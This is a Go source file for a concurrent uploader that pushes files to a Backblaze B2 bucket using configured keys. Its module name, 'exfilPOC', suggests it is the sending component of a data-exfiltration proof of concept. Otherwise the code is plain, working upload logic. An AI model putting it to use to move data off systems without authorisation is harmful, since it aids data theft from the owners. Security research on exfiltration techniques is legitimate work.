package uploader

import (
	"context"
	"fmt"
	"io"
	"log"
	"runtime"
	"sync"

	"github.com/Backblaze/blazer/b2"
	"github.com/schollz/progressbar/v3"
	"golang.org/x/sync/semaphore"

	cfg "exfilPOC/pkg/config"
)

const (
	uploadBufferSize = 1024 * 1024 * 5
	minPartSize      = 1024 * 1024 * 5
)

type Uploader struct {
	client      *b2.Client
	bucket      *b2.Bucket
	cfg         *cfg.Config
	progressBar *progressbar.ProgressBar
	bufferPool  sync.Pool
	sem         *semaphore.Weighted
}

func NewUploader(conf *cfg.Config) (*Uploader, error) {

	client, err := b2.NewClient(context.Background(), conf.B2Config.KeyID, conf.B2Config.ApplicationKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create B2 client: %w", err)
	}

	bucket, err := client.Bucket(context.Background(), conf.B2Config.BucketName)
	if err != nil {
		return nil, fmt.Errorf("failed to get bucket: %w", err)
	}

	workers := runtime.NumCPU() * 2
	if conf.Concurrency.Workers > 0 {
		workers = conf.Concurrency.Workers
	}

	log.Printf("Successfully connected to bucket: %s with %d workers", conf.B2Config.BucketName, workers)

	return &Uploader{
		client: client,
		bucket: bucket,
		cfg:    conf,
		bufferPool: sync.Pool{
			New: func() interface{} {
				return make([]byte, uploadBufferSize)
			},
		},
		sem: semaphore.NewWeighted(int64(workers)),
	}, nil
}

func (u *Uploader) UploadFile(ctx context.Context, key string, reader io.Reader, size int64) error {

	buf := u.bufferPool.Get().([]byte)
	defer u.bufferPool.Put(buf)

	if u.progressBar == nil {
		u.progressBar = progressbar.DefaultBytes(size, "Uploading")
	}

	progressReader := &progressReader{
		reader: reader,
		bar:    u.progressBar,
		buffer: buf,
	}

	obj := u.bucket.Object(key)
	w := obj.NewWriter(ctx)
	w.ChunkSize = uploadBufferSize

	if _, err := io.CopyBuffer(w, progressReader, buf); err != nil {
		w.Close()
		return fmt.Errorf("failed to upload: %w", err)
	}

	if err := w.Close(); err != nil {
		return fmt.Errorf("failed to finalize upload: %w", err)
	}

	return nil
}

func (u *Uploader) UploadFiles(ctx context.Context, files map[string]io.Reader, sizes map[string]int64) error {
	var wg sync.WaitGroup
	var uploadErrors sync.Map

	for key, reader := range files {
		size := sizes[key]

		wg.Add(1)
		go func() {
			defer wg.Done()

			if err := u.sem.Acquire(ctx, 1); err != nil {
				uploadErrors.Store(key, fmt.Errorf("failed to acquire semaphore: %v", err))
				return
			}
			defer u.sem.Release(1)

			if err := u.UploadFile(ctx, key, reader, size); err != nil {
				uploadErrors.Store(key, err)
			}
		}()
	}

	wg.Wait()

	var errs []error
	uploadErrors.Range(func(key, value interface{}) bool {
		errs = append(errs, fmt.Errorf("failed to upload %s: %v", key, value))
		return true
	})

	if len(errs) > 0 {
		return fmt.Errorf("some uploads failed: %v", errs)
	}

	return nil
}

type progressReader struct {
	reader io.Reader
	bar    *progressbar.ProgressBar
	buffer []byte
}

func (pr *progressReader) Read(p []byte) (n int, err error) {
	n, err = pr.reader.Read(p)
	if n > 0 {
		pr.bar.Add(n)
	}
	return
}
